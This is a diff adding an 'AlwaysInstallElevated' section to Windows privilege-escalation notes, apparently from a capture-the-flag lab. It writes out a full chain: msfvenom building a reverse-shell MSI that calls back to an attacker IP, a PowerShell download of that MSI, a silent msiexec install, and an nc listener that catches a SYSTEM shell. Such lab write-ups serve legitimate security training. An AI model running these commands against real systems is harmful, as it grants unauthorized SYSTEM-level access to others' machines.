@@ -658,6 +658,57 @@ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,Tas
 
 One way to get hints can be by locating a script or log file that indicates a scheduled activity is being run, which is frequently required.
 
+## AlwaysInstallElevated
+
+### Malicious MSI
+
+These registry keys tell windows that a user of any privilege can install `.msi` files are NT AUTHORITY\SYSTEM. All that we need to do is create a malicious `.msi` file, and run it.
+
+We can use `msfvenon` to create the MSI installer. We’ll use a reverse shell payload that I can catch with `nc`:
+
+```bash
+wixnic@kali$ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+Saved as: rev.msi
+```
+
+We’ll upload it just like I did with WinPEAS:
+
+```bash
+C:\ProgramData>powershell wget http://10.10.14.6/rev.msi -outfile rev.msi
+```
+
+This requests the file from our Python webserver and fetches the MSI.
+
+Now we just need to run it with `msiexec`:
+
+```text
+C:\ProgramData>msiexec /quiet /qn /i rev.msi
+```
+
+This returns nothing, but there’s a shell at our listening `nc`:
+
+```text
+wixnic@kali$ rlwrap nc -lnvp 443
+listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 61878
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\WINDOWS\system32>whoami
+nt authority\system
+```
+
+We can grab the root flag from the administrator’s desktop:
+
+```text
+C:\Users\Administrator\Desktop>type root.txt
+82f9ddad************************
+```
+
 ## Applications
 
 ### Insecure GUI Apps
